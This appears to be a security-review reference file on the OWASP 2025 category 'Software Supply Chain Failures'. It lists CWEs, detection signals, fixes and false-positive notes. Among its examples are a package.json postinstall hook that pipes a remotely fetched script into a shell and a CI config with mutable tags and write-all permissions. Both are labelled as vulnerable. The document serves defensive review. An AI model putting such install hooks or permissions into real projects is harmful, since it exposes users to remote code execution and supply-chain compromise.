# A03:2025 Software Supply Chain Failures

Rank: #3 (50% of community survey respondents ranked it #1 concern). Expanded scope from the
2021 "Vulnerable and Outdated Components" - now covers the whole supply chain: dependencies,
CI/CD, build tooling, and developer environments, not just known-CVE libraries.

## What it is

Breakdowns or malicious compromises in how software is built, distributed, or updated - usually
via third-party code/tools/dependencies the system relies on, or a weakly-secured CI/CD pipeline.

## Key CWEs

- CWE-1104 Use of Unmaintained Third Party Components
- CWE-1395 Dependency on Vulnerable Third-Party Component
- CWE-1329 Reliance on Component That is Not Updateable
- CWE-477 Use of Obsolete Function
- CWE-1357 Reliance on Insufficiently Trustworthy Component

## Detection signals

This category is **mostly tooling-driven, not pattern-matched** - real detection requires
running an audit tool against manifests/lockfiles. Use `scripts/dependency_audit.sh`.

Code-level signals worth flagging directly:

- No lockfile committed (`package-lock.json`/`yarn.lock`/`pnpm-lock.yaml`,
  `poetry.lock`/`requirements.txt` with unpinned versions, `Gemfile.lock`, `go.sum`,
  `Cargo.lock`) - means builds aren't reproducible and versions can drift unexpectedly.
- Dependency installed from a non-default/untrusted registry or directly from a git URL/tarball
  instead of the package registry, especially for security-sensitive packages.
- `postinstall`/`preinstall` scripts in `package.json` for unfamiliar or newly-added packages
  (common malware delivery vector - npm worms like Shai-Hulud in 2025 used exactly this).
- CI/CD pipeline (`.github/workflows/*.yml`, `.gitlab-ci.yml`, `Jenkinsfile`) that:
  - Has no separation of duties (one identity can both write code and push to prod with no
    review gate).
  - Uses a third-party Action/plugin pinned to a mutable tag (`uses: someaction@v1`) instead of
    a commit SHA - the tag can be moved to point at malicious code later.
  - Has overly broad secrets/permissions (`permissions: write-all`, a CI token with org-wide
    scope when repo-scope would do).
  - Pulls build artifacts from an untrusted/uncontrolled location.
- A dependency is years out of date with no comment/ticket explaining why it hasn't been
  upgraded.
- No SBOM (Software Bill of Materials) generation step anywhere in the build.

## Fix patterns

```yaml
# VULNERABLE: mutable tag, broad permissions
- uses: some-org/some-action@v1
permissions: write-all
```

```yaml
# FIXED: pin to commit SHA, scope permissions narrowly
- uses: some-org/some-action@a1b2c3d4e5f6...  # pin to full commit SHA
permissions:
  contents: read
  pull-requests: write
```

```json
// package.json - flag this for manual review, don't silently remove without checking why it's there
"scripts": {
  "postinstall": "curl http://example.com/setup.sh | sh"  // VULNERABLE pattern: remote script execution on install
}
```

**Other fixes:**

- Generate and maintain an SBOM (CycloneDX or SPDX) as part of the build.
- Pin exact dependency versions; commit the lockfile; upgrade deliberately, not automatically,
  and test compatibility before merging an upgrade.
- Run `scripts/dependency_audit.sh` (or the relevant ecosystem tool) in CI on every PR, not just
  periodically.
- Subscribe to security advisories for direct dependencies (GitHub Dependabot alerts, OSV).
- Require code review + a separate approver for anything that touches CI/CD config, build
  scripts, or release pipelines - no single person ships unreviewed changes to prod.
- Use staged/canary rollouts for dependency upgrades rather than updating all environments
  simultaneously.
- Prefer signed packages and verify signatures where the ecosystem supports it.

## False-positive notes

- A pinned-but-old dependency with no known CVEs against the pinned version isn't automatically
  a finding - check the actual audit tool output for real advisories, don't flag age alone as
  Critical/High; age with no CVE is at most Low/informational ("consider upgrading").
- A `postinstall` script that's part of a major, well-known package's normal build process
  (e.g. compiling a native binding) is expected - the concern is *unexpected or newly modified*
  install scripts, especially after a routine version bump.
